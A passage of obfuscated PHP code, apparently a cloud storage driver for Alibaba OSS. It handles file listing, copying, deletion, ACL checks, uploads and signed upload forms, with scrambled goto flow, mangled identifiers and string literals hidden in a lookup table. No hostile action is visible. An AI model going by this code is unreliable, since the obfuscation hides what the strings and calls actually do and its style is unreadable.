$E’‚èŒìš¾[33], $E’‚èŒìš¾[183] => isset($d¼õŒá“‚¨[0]) ? $d¼õŒá“‚¨[0] : $E’‚èŒìš¾[33]); goto EàÄí›£Ì; a¶½Ğƒ„Úè: if (!$FÈ‘«œ¤÷ || !($Bæ‡Ûª½¼˜ = $FÈ‘«œ¤÷->getRules())) { return null; } $f„Á¤´å = $Bæ‡Ûª½¼˜[0]->getAllowedOrigins(); $eÅÎÃé’Ğ = $Bæ‡Ûª½¼˜[0]->getAllowedMethods(); goto cŸšáÉƒ‘®; EàÄí›£Ì: } public function isBucketCors() { goto BÎõˆ§†Ñ; BÎõˆ§†Ñ: $a÷ÔŞ“½ã¢ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Eª§¼„‡ = $this->getBucketCors(); if (!$Eª§¼„‡ || !is_array($Eª§¼„‡)) { return !1; } goto aáÕ±ïÄ“‚; aáÕ±ïÄ“‚: if ($Eª§¼„‡[$a÷ÔŞ“½ã¢[181]] != $a÷ÔŞ“½ã¢[182] || $Eª§¼„‡[$a÷ÔŞ“½ã¢[183]] != $a÷ÔŞ“½ã¢[182]) { return !1; } $Aà‰óÄ”ôÁ = array_map($a÷ÔŞ“½ã¢[184], $Eª§¼„‡[$a÷ÔŞ“½ã¢[185]]); if (!is_array($Aà‰óÄ”ôÁ)) { $Aà‰óÄ”ôÁ = array(); } goto D“Ó‹Ğäè; D“Ó‹Ğäè: $aÃˆ¤í†¾ = array($a÷ÔŞ“½ã¢[186], $a÷ÔŞ“½ã¢[187], $a÷ÔŞ“½ã¢[188], $a÷ÔŞ“½ã¢[189], $a÷ÔŞ“½ã¢[190]); $dÁ¿ì†Êà¼ = array_diff($aÃˆ¤í†¾, $Aà‰óÄ”ôÁ); return empty($dÁ¿ì†Êà¼); goto BÛÉÛ«ÀŸ; BÛÉÛ«ÀŸ: } public function mkfile($f‘š¸Êê¥, $eô²ÇÄà®Œ = '', $fÊ…å¶Ÿø = REPEAT_RENAME) { $Eæˆ®ÏÄš = $this->setContent($f‘š¸Êê¥, $eô²ÇÄà®Œ); if ($Eæˆ®ÏÄš !== !1) { return $this->getPathOuter($f‘š¸Êê¥); } return !1; } public function mkdir($C‡–™ ËŸó, $b½³É—²¶¡ = REPEAT_SKIP) { if ($this->_isFolder($C‡–™ ËŸó)) { return $this->getPathOuter($C‡–™ ËŸó); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($C‡–™ ËŸó)); } catch (OSS\Core\OssException $c‚ŠÈê¨ø½) { return !1; } return $this->getPathOuter($C‡–™ ËŸó); } private function fileList($b¯šä„Í”, $cÅÓ²Ğà½» = '', $E¥ˆÀ•‘  = 0) { goto Aµ¡ºÓŠ³—; Càë‹ô²•Ô: $BÅôÉàŸç = $F°ˆì‰³±… = array(); while (!0) { check_abort(); $D†œ¤Ú¸Œ = array($a¶œ³øêÄ[1292] => $cÅÓ²Ğà½», $a¶œ³øêÄ[1293] => $dÊ«‰Ñ·Ï, $a¶œ³øêÄ[1294] => $Fßô‚äêéí, $a¶œ³øêÄ[1295] => $a”œ‘«Ôå§); try { $FÊïÍİÎ²‹ = $this->client->listObjects($this->bucket, $D†œ¤Ú¸Œ); } catch (OSS\Core\OssException $Bß²Æ¯šß) { break; } $a”œ‘«Ôå§ = $FÊïÍİÎ²‹->getNextMarker(); $dãŒçÄÒæš = $FÊïÍİÎ²‹->getObjectList(); $bÈ•¢°œØ… = $FÊïÍİÎ²‹->getPrefixList(); foreach ($dãŒçÄÒæš as $E²ç§æ¡Ìè) { goto aãËÎ¡È”Æ; aãËÎ¡È”Æ: if ($E²ç§æ¡Ìè->getKey() == $dÊ«‰Ñ·Ï) { continue; } $CÁˆŸ—åÌ = $E²ç§æ¡Ìè->getKey(); $d¤öë« æâ = $E²ç§æ¡Ìè->getSize(); goto AÅíŠµ®§ñ; F§ìÅ…§æ: if ($FšÚÔËÂ›í) { $this->cacheMethod($a¶œ³øêÄ[199], $CÁˆŸ—åÌ, $Aóà¼×õ„); $this->cacheMethod($a¶œ³øêÄ[200], $CÁˆŸ—åÌ, array($a¶œ³øêÄ[78] => $d¤öë« æâ, $a¶œ³øêÄ[1296] => $d¤öë« æâ, $a¶œ³øêÄ[84] => strtotime($CˆŞñ­à µ), $a¶œ³øêÄ[1297] => $CˆŞñ­à µ)); } if ($Aóà¼×õ„) { $BÅôÉàŸç[] = $CÁˆŸ—åÌ; continue; } $F°ˆì‰³±…[] = $dã×¬’¤œÙ; goto D¤òõä™ÕÔ; AÅíŠµ®§ñ: $CˆŞñ­à µ = $E²ç§æ¡Ìè->getLastModified(); $dã×¬’¤œÙ = $E¥ˆÀ•‘  ? array($a¶œ³øêÄ[28] => $CÁˆŸ—åÌ, $a¶œ³øêÄ[78] => $d¤öë« æâ, $a¶œ³øêÄ[197] => strtotime($CˆŞñ­à µ)) : $CÁˆŸ—åÌ; $Aóà¼×õ„ = $d¤öë« æâ == 0 && substr($CÁˆŸ—åÌ, strlen($CÁˆŸ—åÌ) - 1, 1) == $a¶œ³øêÄ[8] ? !0 : !1; goto F§ìÅ…§æ; D¤òõä™ÕÔ: } foreach ($bÈ•¢°œØ… as $f½Úø¨„ƒ¨) { $BÅôÉàŸç[] = $f½Úø¨„ƒ¨->getPrefix(); if ($FšÚÔËÂ›í) { $this->cacheMethod($a¶œ³øêÄ[199], $CÁˆŸ—åÌ, !0); } } if ($a”œ‘«Ôå§ === $a¶œ³øêÄ[33]) { break; } } if ($FšÚÔËÂ›í) { $this->cacheMethod($a¶œ³øêÄ[199], $b¯šä„Í”, !0); } goto eôàø¹Ñî÷; Aµ¡ºÓŠ³—: $a¶œ³øêÄ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b¯šä„Í” = trim($b¯šä„Í”, $a¶œ³øêÄ[8]); $dÊ«‰Ñ·Ï = empty($b¯šä„Í”) && $b¯šä„Í” !== $a¶œ³øêÄ[191] ? $a¶œ³øêÄ[33] : $b¯šä„Í” . $a¶œ³øêÄ[8]; goto B×ÎÑÛÚ­ß; B×ÎÑÛÚ­ß: $a”œ‘«Ôå§ = $a¶œ³øêÄ[33]; $Fßô‚äêéí = 1000; $FšÚÔËÂ›í = $this->listItemCache === !1 ? !1 : !0; goto Càë‹ô²•Ô; eôàø¹Ñî÷: return array($a¶œ³øêÄ[75] => $BÅôÉàŸç, $a¶œ³øêÄ[74] => $F°ˆì‰³±…); goto b»›Â±¬Ì¯; b»›Â±¬Ì¯: } public function copyFile($e©«Ô‰–, $bï¡†ªÃ÷ñ) { $f¬¥‹‘ºä = $this->size($e©«Ô‰–); if ($f¬¥‹‘ºä < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $e©«Ô‰–, $this->bucket, $this->pathEncode($bï¡†ªÃ÷ñ)); } catch (OSS\Core\OssException $DŒ­±£éÇ¶) { return !1; } return $this->getPathOuter($bï¡†ªÃ÷ñ); } $føŒ«‘îÍ¸ = $this->multiCopyObject($e©«Ô‰–, $bï¡†ªÃ÷ñ, $f¬¥‹‘ºä); return $føŒ«‘îÍ¸ ? $this->getPathOuter($bï¡†ªÃ÷ñ) : !1; } private function multiCopyObject($fèÒùÅñ¹, $Aóæ¢à©›, $Aª™áã“Õ±) { $DÜ¯¶àˆÍ– =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; try { goto Fó¢×ß¸´î; B¦­£áŒëà: $AÇÂ™ ”¦ô = 1024 * 1024 * 10; $BğµÔã»«Œ = $this->client->generateMultiuploadParts($Aª™áã“Õ±, $AÇÂ™ ”¦ô); foreach ($BğµÔã»«Œ as $A¹‰Ò¬ö‘ß => $f™ì“¬²ÁŠ) { $E‘Õ’­¾½Ü = $fÜõÜ‚‰òÊ + (int) $f™ì“¬²ÁŠ[$DÜ¯¶àˆÍ–[1299]]; $bÑˆï´¢ = (int) $f™ì“¬²ÁŠ[$DÜ¯¶àˆÍ–[335]] + $E‘Õ’­¾½Ü - 1; $FŒ›‹êõß = array($DÜ¯¶àˆÍ–[1300] => $E‘Õ’­¾½Ü, $DÜ¯¶àˆÍ–[1301] => $bÑˆï´¢); $A“åğƒ«Ç[] = $this->client->uploadPartCopy($this->bucket, $fèÒùÅñ¹, $this->bucket, $this->pathEncode($Aóæ¢à©›), $A—éò÷´¬, $bÈÂƒì¥—Ş, $FŒ›‹êõß); $A—éò÷´¬ = $A—éò÷´¬ + 1; } goto F†±ÕÓÒ¿•; F†±ÕÓÒ¿•: $E¨Ó¤“Ò±æ = array(); foreach ($A“åğƒ«Ç as $A¹‰Ò¬ö‘ß => $D¡Ğ¯äš) { $E¨Ó¤“Ò±æ[] = array($DÜ¯¶àˆÍ–[1302] => $A¹‰Ò¬ö‘ß + 1, $DÜ¯¶àˆÍ–[1303] => $D¡Ğ¯äš); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Aóæ¢à©›), $bÈÂƒì¥—Ş, $E¨Ó¤“Ò±æ); goto B½øÔ„µÜ¿; Fó¢×ß¸´î: $FíõÀá Ä = array(); if ($c˜“æÖ®é = $this->hashMd5($fèÒùÅñ¹)) { $FíõÀá Ä = array(OSS\OssClient::OSS_HEADERS => array($DÜ¯¶àˆÍ–[1298] => $c˜“æÖ®é)); } $bÈÂƒì¥—Ş = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Aóæ¢à©›), $FíõÀá Ä); goto C¹›í‚·ÚÛ; C¹›í‚·ÚÛ: $A—éò÷´¬ = 1; $fÜõÜ‚‰òÊ = 0; $A“åğƒ«Ç = array(); goto B¦­£áŒëà; B½øÔ„µÜ¿: } catch (OSS\Core\OssException $D–¸¬¥¢¥) { return !1; } return !0; } public function moveFile($b™“Ï‚ò, $cÔ‹›Ñ¶Æì) { if ($this->copyFile($b™“Ï‚ò, $cÔ‹›Ñ¶Æì)) { $this->remove($b™“Ï‚ò); return $this->getPathOuter($cÔ‹›Ñ¶Æì); } return !1; } public function delFile($FŒÓç¯¦ƒ¥) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($FŒÓç¯¦ƒ¥)); } catch (OSS\Core\OssException $d‡‹”ÉªÆ”) { return !1; } return !0; } public function delFolder($eìË˜³ñ¤À) { goto dğÉ‹Ñ¹‚–; DŒã†´øÌá: $Bˆ¹ŞêãŞ¸ = $this->delByBatch($C³«†²¼×÷[$Eå­Öå¹™Ö[75]]); if (!$Bˆ¹ŞêãŞ¸) { return !1; } return $this->delFile($Aµ¬™öùÛÑ); goto fÌ’×±‰‚ø; A°ÎËÄ ×: if (!empty($eìË˜³ñ¤À) && $eìË˜³ñ¤À !== $Eå­Öå¹™Ö[191] && !in_array($Aµ¬™öùÛÑ, $C³«†²¼×÷[$Eå­Öå¹™Ö[75]])) { $C³«†²¼×÷[$Eå­Öå¹™Ö[75]][] = $Aµ¬™öùÛÑ; } $Bˆ¹ŞêãŞ¸ = $this->delByBatch($C³«†²¼×÷[$Eå­Öå¹™Ö[74]]); if (!$Bˆ¹ŞêãŞ¸) { return !1; } goto DŒã†´øÌá; DÏ¥Ú©Õ˜”: $C³«†²¼×÷ = $this->fileList($eìË˜³ñ¤À); $this->listItemCache = !0; $Aµ¬™öùÛÑ = trim($eìË˜³ñ¤À, $Eå­Öå¹™Ö[8]) . $Eå­Öå¹™Ö[8]; goto A°ÎËÄ ×; dğÉ‹Ñ¹‚–: $Eå­Öå¹™Ö =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->exist($eìË˜³ñ¤À)) { return !0; } $this->listItemCache = !1; goto DÏ¥Ú©Õ˜”; fÌ’×±‰‚ø: } private function delByBatch($AØ†âØÜÓ©) { foreach (array_chunk($AØ†âØÜÓ©, 1000) as $Ašœ¬ã¸—) { try { $this->client->deleteObjects($this->bucket, $Ašœ¬ã¸—); } catch (OSS\Core\OssException $e”—¥Ú¯À) { return !1; } } return !0; } public function rename($D«Ÿ…ñæªÉ, $c¯×©É™ä°) { return $this->renameObject($D«Ÿ…ñæªÉ, $c¯×©É™ä°); } private function fileInfo($AÜ²øºÊÚ±, $bÚ¤ ††ŒÉ = false, $Dìõ­ëÕš‡ = array()) { goto fì‡˜“ŞÔÛ; DÂƒùÀó: if (isset($Dìõ­ëÕš‡[$B‹—ÍÚËé[78]])) { $B¤äŸÌ«á‰[$B‹—ÍÚËé[78]] = $Dìõ­ëÕš‡[$B‹—ÍÚËé[78]]; } if (isset($Dìõ­ëÕš‡[$B‹—ÍÚËé[84]])) { $B¤äŸÌ«á‰[$B‹—ÍÚËé[84]] = $Dìõ­ëÕš‡[$B‹—ÍÚËé[84]]; } if (isset($Dìõ­ëÕš‡[$B‹—ÍÚËé[197]]) && !trim($B¤äŸÌ«á‰[$B‹—ÍÚËé[84]])) { $B¤äŸÌ«á‰[$B‹—ÍÚËé[84]] = $Dìõ­ëÕš‡[$B‹—ÍÚËé[197]]; } goto Bƒ„¨„½ó¡; Bƒ„¨„½ó¡: return $B¤äŸÌ«á‰; goto bˆÃ™óíÌ‹; fì‡˜“ŞÔÛ: $B‹—ÍÚËé =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B¤äŸÌ«á‰ = array($B‹—ÍÚËé[28] => $this->pathThis($AÜ²øºÊÚ±), $B‹—ÍÚËé[76] => $this->getPathOuter($AÜ²øºÊÚ±), $B‹—ÍÚËé[29] => $B‹—ÍÚËé[193], $B‹—ÍÚËé[78] => isset($Dìõ­ëÕš‡[$B‹—ÍÚËé[78]]) ? $Dìõ­ëÕš‡[$B‹—ÍÚËé[78]] : 0, $B‹—ÍÚËé[168] => $this->ext($AÜ²øºÊÚ±)); if ($bÚ¤ ††ŒÉ) { return $B¤äŸÌ«á‰; } goto FÄò¬ùÀ¦ğ; FÄò¬ùÀ¦ğ: $B¤äŸÌ«á‰[$B‹—ÍÚËé[194]] = $B¤äŸÌ«á‰[$B‹—ÍÚËé[84]] = 0; $B¤äŸÌ«á‰[$B‹—ÍÚËé[195]] = $B¤äŸÌ«á‰[$B‹—ÍÚËé[196]] = !0; if (empty($Dìõ­ëÕš‡)) { $E¸ÏËÁ¶Ïæ = $this->objectMeta($AÜ²øºÊÚ±); if (!$E¸ÏËÁ¶Ïæ) { return $B¤äŸÌ«á‰; } $Dìõ­ëÕš‡ = array($B‹—ÍÚËé[84] => strtotime($E¸ÏËÁ¶Ïæ[$B‹—ÍÚËé[1297]]), $B‹—ÍÚËé[78] => $E¸ÏËÁ¶Ïæ[$B‹—ÍÚËé[1296]] + 0); } goto DÂƒùÀó; bˆÃ™óíÌ‹: } private function folderInfo($A„ˆñƒ¤², $Dá­Íî‹Ğ = false, $D†ğŞ¹¡İÁ = array()) { goto bÕ°ÊªñåÈ; DùŒŒ»³»÷: if (isset($D†ğŞ¹¡İÁ[$D“Î¸¶’ƒÊ[84]])) { $D¿İèá™¾[$D“Î¸¶’ƒÊ[84]] = $D†ğŞ¹¡İÁ[$D“Î¸¶’ƒÊ[84]]; } if (isset($D†ğŞ¹¡İÁ[$D“Î¸¶’ƒÊ[194]])) { $D¿İèá™¾[$D“Î¸¶’ƒÊ[194]] = $D†ğŞ¹¡İÁ[$D“Î¸¶’ƒÊ[194]]; } return $D¿İèá™¾; goto e»˜Úä¶; CÜ¶£ÊŠ½Ö: $D¿İèá™¾[$D“Î¸¶’ƒÊ[194]] = $D¿İèá™¾[$D“Î¸¶’ƒÊ[84]] = 0; $D¿İèá™¾[$D“Î¸¶’ƒÊ[195]] = $D¿İèá™¾[$D“Î¸¶’ƒÊ[196]] = !0; if (empty($D†ğŞ¹¡İÁ)) { $A„ˆñƒ¤² = rtrim($A„ˆñƒ¤², $D“Î¸¶’ƒÊ[8]) . $D“Î¸¶’ƒÊ[8]; $Bö»«Âã‰ = $this->objectMeta($A„ˆñƒ¤²); if (!$Bö»«Âã‰) { return $D¿İèá™¾; } $D†ğŞ¹¡İÁ = array($D“Î¸¶’ƒÊ[194] => $Bö»«Âã‰[$D“Î¸¶’ƒÊ[505]][$D“Î¸¶’ƒÊ[1304]], $D“Î¸¶’ƒÊ[84] => strtotime($Bö»«Âã‰[$D“Î¸¶’ƒÊ[1297]])); } goto DùŒŒ»³»÷; bÕ°ÊªñåÈ: $D“Î¸¶’ƒÊ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D¿İèá™¾ = array($D“Î¸¶’ƒÊ[28] => $this->pathThis($A„ˆñƒ¤²), $D“Î¸¶’ƒÊ[76] => $this->getPathOuter($D“Î¸¶’ƒÊ[8] . $A„ˆñƒ¤²), $D“Î¸¶’ƒÊ[29] => $D“Î¸¶’ƒÊ[77]); if ($Dá­Íî‹Ğ) { return $D¿İèá™¾; } goto CÜ¶£ÊŠ½Ö; e»˜Úä¶: } public function listPath($FÃˆ•´ÕˆÚ, $eÇĞô¤Ë = false) { $E® ¾±³œÍ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bÅ˜‰íù”Ş = $this->fileList($FÃˆ•´ÕˆÚ, $E® ¾±³œÍ[8], !0); foreach ($bÅ˜‰íù”Ş[$E® ¾±³œÍ[75]] as $e£àíßÌŠ” => $EŒ©Ò„†ƒ¡) { $bÅ˜‰íù”Ş[$E® ¾±³œÍ[75]][$e£àíßÌŠ”] = $this->folderInfo($EŒ©Ò„†ƒ¡, $eÇĞô¤Ë, $EŒ©Ò„†ƒ¡); } foreach ($bÅ˜‰íù”Ş[$E® ¾±³œÍ[74]] as $e£àíßÌŠ” => $EŒ©Ò„†ƒ¡) { $bÅ˜‰íù”Ş[$E® ¾±³œÍ[74]][$e£àíßÌŠ”] = $this->fileInfo($EŒ©Ò„†ƒ¡[$E® ¾±³œÍ[28]], $eÇĞô¤Ë, $EŒ©Ò„†ƒ¡); } return $bÅ˜‰íù”Ş; } public function has($EÛ»„•ó¼¶, $eäâä²³Ğ = false, $fö„´Š¸· = true) { goto bŸõ˜Ó‰Ëº; AÅÖè™†êÊ: while (!0) { check_abort(); $B¿®«ŠÈ»ô = array($fŞğ‚¨Ö´´[1292] => $fŞğ‚¨Ö´´[8], $fŞğ‚¨Ö´´[1293] => $Fá¸Â²ä¯å, $fŞğ‚¨Ö´´[1294] => $c„ŞÄ×¼ùŞ, $fŞğ‚¨Ö´´[1295] => $E¡Ùøå”—); try { $bÒ¦°Õäì = $this->client->listObjects($this->bucket, $B¿®«ŠÈ»ô); } catch (OSS\Core\OssException $fƒ°£™æÁ) { break; } $E¡Ùøå”— = $bÒ¦°Õäì->getNextMarker(); $FÜèè©¹„‹ = $bÒ¦°Õäì->getObjectList(); $aÉÔ®¡á¬ø = $bÒ¦°Õäì->getPrefixList(); if ($eäâä²³Ğ) { if (count($FÜèè©¹„‹) > 1 || count($FÜèè©¹„‹) == 1 && $FÜèè©¹„‹[0]->getKey() != $Fá¸Â²ä¯å) { $DÌª¡ªä» += count($FÜèè©¹„‹) - 1; } if (!empty($aÉÔ®¡á¬ø)) { $eİ±ÌŞÃƒˆ += count($aÉÔ®¡á¬ø); } if ($E¡Ùøå”— === $fŞğ‚¨Ö´´[33]) { break; } continue; } if ($fö„´Š¸·) { if (!empty($FÜèè©¹„‹)) { if (count($FÜèè©¹„‹) > 1 || $FÜèè©¹„‹[0]->getKey() != $Fá¸Â²ä¯å) { return !0; } } } else { if (!empty($aÉÔ®¡á¬ø)) { return !0; } } if ($E¡Ùøå”— === $fŞğ‚¨Ö´´[33]) { break; } } if ($eäâä²³Ğ) { return array($fŞğ‚¨Ö´´[203] => $DÌª¡ªä», $fŞğ‚¨Ö´´[204] => $eİ±ÌŞÃƒˆ); } return !1; goto E·‹™‰ù¬Š; a¯ºïÑ•˜ä: $E¡Ùøå”— = $fŞğ‚¨Ö´´[33]; $c„ŞÄ×¼ùŞ = 500; $DÌª¡ªä» = $eİ±ÌŞÃƒˆ = 0; goto AÅÖè™†êÊ; bŸõ˜Ó‰Ëº: $fŞğ‚¨Ö´´ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EÛ»„•ó¼¶ = trim($EÛ»„•ó¼¶, $fŞğ‚¨Ö´´[8]); $Fá¸Â²ä¯å = empty($EÛ»„•ó¼¶) && $EÛ»„•ó¼¶ !== $fŞğ‚¨Ö´´[191] ? $fŞğ‚¨Ö´´[33] : $EÛ»„•ó¼¶ . $fŞğ‚¨Ö´´[8]; goto a¯ºïÑ•˜ä; E·‹™‰ù¬Š: } public function listAll($dóáÀ•ˆ­¬) { $B­š†çé•ô =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d¼°ï»§‰ä = $this->fileList($dóáÀ•ˆ­¬, $B­š†çé•ô[33], !0); $d²„Å‚»˜ = array(); foreach ($d¼°ï»§‰ä[$B­š†çé•ô[74]] as $cäçôƒô¢Á) { $d²„Å‚»˜[$cäçôƒô¢Á[$B­š†çé•ô[28]]] = $cäçôƒô¢Á[$B­š†çé•ô[78]]; } foreach ($d¼°ï»§‰ä[$B­š†çé•ô[75]] as $cäçôƒô¢Á) { if (is_string($cäçôƒô¢Á)) { $d²„Å‚»˜[$cäçôƒô¢Á] = 0; } } return $this->listAllFiles($dóáÀ•ˆ­¬, array_keys($d²„Å‚»˜), $d²„Å‚»˜); } public function canRead($d»ÓÂĞÚÙ) { $dâ³ÖÇ¦† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BàÏâÛ•õ÷ = $this->pathAcl($d»ÓÂĞÚÙ); return $BàÏâÛ•õ÷ == $dâ³ÖÇ¦†[1305] || $BàÏâÛ•õ÷ == $dâ³ÖÇ¦†[544] ? !0 : !1; } public function canWrite($AµÆÈÛ…‘) { $B·¡Š„Úš« = $this->pathAcl($AµÆÈÛ…‘); return $B·¡Š„Úš« == $_SERVER[Ôğ—¤Šµˆ˜ñ£][544] ? !0 : !1; } public function pathAcl($aÛ‡å×»©È) { goto C×ó¤£¯œœ; Câ×ŠÃùĞ÷: $Aâà£«Ù˜ = $A½¯˜ä°õ == $D×îŞ›éõá[34] ? $this->bucketAcl : $A½¯˜ä°õ; if ($Aâà£«Ù˜ == $D×îŞ›éõá[1306]) { return $D×îŞ›éõá[1305]; } if ($Aâà£«Ù˜ == $D×îŞ›éõá[1307]) { return $D×îŞ›éõá[544]; } goto Fö‚—æâÃç; C×ó¤£¯œœ: $D×îŞ›éõá =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $A½¯˜ä°õ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($aÛ‡å×»©È)); } catch (OSS\Core\OssException $fóÊ†ƒßÌ) { return !1; } goto Câ×ŠÃùĞ÷; Fö‚—æâÃç: return $Aâà£«Ù˜; goto fÖ÷¤Ğ°Ş‹; fÖ÷¤Ğ°Ş‹: } private function chmodPath($b”…êËªšÀ, $eí¸¾¼©¶Á = '') { $B¼áÓÃõ‡Á =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F§—£à³Ÿ = empty($eí¸¾¼©¶Á) ? $B¼áÓÃõ‡Á[1307] : $eí¸¾¼©¶Á; $f·¯ÚáÊ« = array($B¼áÓÃõ‡Á[34], $B¼áÓÃõ‡Á[192], $B¼áÓÃõ‡Á[1306], $B¼áÓÃõ‡Á[1307]); if (!in_array($F§—£à³Ÿ, $f·¯ÚáÊ«)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($b”…êËªšÀ), $F§—£à³Ÿ); } catch (OSS\Core\OssException $A™¢“Ûœ«) { return !1; } return !0; } public function getContent($E»…Öµ¤—‹) { return $this->fileSubstr($E»…Öµ¤—‹, -1); } public function setContent($D÷º§£İ½«, $d„Å› áœÖ = '') { $f„ˆØ½ñºÎ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; try { $CÎó¢‡„Îª = $this->trafficLimit($f„ˆØ½ñºÎ[1308]); $ağØÑÔ‹ = $this->client->putObject($this->bucket, $this->pathEncode($D÷º§£İ½«), $d„Å› áœÖ, $CÎó¢‡„Îª); } catch (OSS\Core\OssException $cõ˜„·ø…å) { return !1; } $D¤‚ÙÅçŠ† = array($f„ˆØ½ñºÎ[1298] => trim($ağØÑÔ‹[$f„ˆØ½ñºÎ[1309]], $f„ˆØ½ñºÎ[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($D÷º§£İ½«))); $this->updateObjMeta($D÷º§£İ½«, $D¤‚ÙÅçŠ†); return isset($ağØÑÔ‹[$f„ˆØ½ñºÎ[1310]][$f„ˆØ½ñºÎ[1257]]) ? !0 : !1; } private function updateObjMeta($f¡”â—ª­ª, $CÎ¦è¦ÖĞ±) { $f¡”â—ª­ª = $this->pathEncode($f¡”â—ª­ª); try { $béÚ™ÊÍ„Š = array(OSS\OssClient::OSS_HEADERS => $CÎ¦è¦ÖĞ±); $this->client->copyObject($this->bucket, $f¡”â—ª­ª, $this->bucket, $f¡”â—ª­ª, $béÚ™ÊÍ„Š); } catch (OSS\Core\OssException $dÈíšÖÊîÅ) { return !1; } return !0; } public function upload($A«¼õã±ˆê, $B‘¶ó°Ú¼ç, $E¨Şò¿•çä = false, $C©âËª‹ñ = REPEAT_REPLACE) { $CÒµáˆ“Ÿ¨ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eèŸ”çÆ– = trim($A«¼õã±ˆê, $CÒµáˆ“Ÿ¨[8]); $D¤ßÛ®—ÜŒ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($CÒµáˆ“Ÿ¨[1298] => @md5_file($B‘¶ó°Ú¼ç)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($A«¼õã±ˆê))); $D¤ßÛ®—ÜŒ = $this->trafficLimit($CÒµáˆ“Ÿ¨[1308], $D¤ßÛ®—ÜŒ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($eèŸ”çÆ–), $B‘¶ó°Ú¼ç, $D¤ßÛ®—ÜŒ); } catch (OSS\Core\OssException $dƒÍ£äŠ™) { return !1; } return $this->getPathOuter($A«¼õã±ˆê); } public function getHost() { $A®²«ƒâÆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a¤ÚĞ¤¹Ûù = explode($A®²«ƒâÆ[177], parent::getHost()); return $a¤ÚĞ¤¹Ûù[0] . $A®²«ƒâÆ[177] . $this->bucket . $A®²«ƒâÆ[95] . $a¤ÚĞ¤¹Ûù[1]; } public function uploadFormData($B¡ƒ÷¿ÂŒ, $aÃ‰¯Ñ‡¨£ = 3600) { goto C«Ì†ÏÛÊÑ; C«Ì†ÏÛÊÑ: $EïØĞó¶· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!($Cµ„ˆ¢Ü¤Î = $this->getHost())) { return !1; } $bÛçæ´‹¼¸ = $aÃ‰¯Ñ‡¨£; goto fïŒ„ğ¼‘š; Dò‘´›ÙÈ•: return $c’¯®±—; goto f½×Ã»òç; a›ëáøÆ«: $A¾ŒæÒœŒ = $this->pathFather($B¡ƒ÷¿ÂŒ); $b™º¶¡´ İ = array($EïØĞó¶·[1212] => $eŠŞ¸¬Ñ×, $EïØĞó¶·[1213] => array(array($EïØĞó¶·[1313], 0, $a¾î§ğÅ¾Ã), array($EïØĞó¶·[1216], $EïØĞó¶·[1217], $A¾ŒæÒœŒ))); $D³õ°óò²™ = base64_encode(json_encode($b™º¶¡´ İ)); goto A³ã¹Ñ±Æ; fïŒ„ğ¼‘š: $Aè¢ğóŠœ = date($EïØĞó¶·[1311], time() + $bÛçæ´‹¼¸); $fÑº´ßİİ÷ = new DateTime($Aè¢ğóŠœ); $eŠŞ¸¬Ñ× = $fÑº´ßİİ÷->format(DateTime::ISO8601); goto fÕÃàÂ‡ŒÖ; fÕÃàÂ‡ŒÖ: $cÓ†×Öï£ = strpos($eŠŞ¸¬Ñ×, $EïØĞó¶·[294]); $eŠŞ¸¬Ñ× = substr($eŠŞ¸¬Ñ×, 0, $cÓ†×Öï£) . $EïØĞó¶·[1312]; $a¾î§ğÅ¾Ã = 1048576000 * 5; goto a›ëáøÆ«; A³ã¹Ñ±Æ: $eÆ’ïŞ„’¨ = base64_encode(hash_hmac($EïØĞó¶·[230], $D³õ°óò²™, $this->secret, !0)); $c’¯®±— = array($EïØĞó¶·[1222] => $D³õ°óò²™, $EïØĞó¶·[1314] => $this->accessKey, $EïØĞó¶·[1218] => $EïØĞó¶·[1210], $EïØĞó¶·[1315] => $eÆ’ïŞ„’¨, $EïØĞó¶·[175] => $Cµ„ˆ¢Ü¤Î); $c’¯®±— = $this->trafficLimit($EïØĞó¶·[1308], $c’¯®±—); goto Dò‘´›ÙÈ•; f½×Ã»òç: } public function multiUploadFormData($Cì‰ìãí‰É, $E¬æƒÜ¡ãÅ = 3600) { $DÃ¿÷Ûš›† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!($dÍò‘ä‚  = $this->getHost())) { return !1; } $b°ßŠ‚ËÊ = $this->trafficLimit($DÃ¿÷Ûš›†[1308]); $e¸öÁ—’‰˜ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Cì‰ìãí‰É), $b°ßŠ‚ËÊ); return array($DÃ¿÷Ûš›†[221] => $e¸öÁ—’‰˜, $DÃ¿÷Ûš›†[175] => $dÍò‘ä‚  . $DÃ¿÷Ûš›†[8] . $this->pathEncode($Cì‰ìãí‰É), $DÃ¿÷Ûš›†[222] => gmdate($DÃ¿÷Ûš›†[1316]), $DÃ¿÷Ûš›†[93] => $Cì‰ìãí‰É); } public function multiUploadAuthData($dİ–É“ëÓÌ, $dÛã£ë®˜Š = array()) { goto f©©ãÓÂÄØ; c®öíëÁˆË: if 